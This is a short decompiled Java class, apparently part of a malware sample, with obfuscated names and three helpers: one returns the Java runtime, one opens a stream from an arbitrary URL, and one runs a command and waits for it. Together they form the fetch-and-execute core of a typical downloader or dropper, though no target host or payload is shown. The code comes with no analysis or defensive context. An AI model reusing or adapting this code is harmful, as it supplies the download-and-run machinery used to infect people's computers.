import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Idmer
{
    public static Runtime getRT() {
        return Runtime.getRuntime();
    }
    
    public static InputStream createIS(final String sdhds) throws Exception {
        final URL url = new URL(sdhds);
        try {
            url.openConnection();
        }
        catch (Exception ex) {}
        return url.openStream();
    }
    
    public static void exe(final String fn) throws Exception {
        final Process dexa = getRT().exec(fn);
        dexa.waitFor();
    }
}
